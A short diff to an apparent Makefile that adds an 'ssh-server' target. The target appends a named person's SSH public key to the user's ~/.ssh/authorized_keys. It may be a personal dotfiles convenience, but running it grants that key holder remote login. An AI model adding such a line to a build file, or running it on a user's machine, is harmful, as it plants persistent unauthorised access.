@@ -30,3 +30,6 @@ clean-dot-file:
 clean: clean-dot-file
 
 re: clean all
+
+ssh-server:
+	echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKuKqJf8l+LQTl0NpSBuT9Ln7b7LRH4zxAJRgP9BUPpG victor@afanassieff.com" >> ~/.ssh/authorized_keys
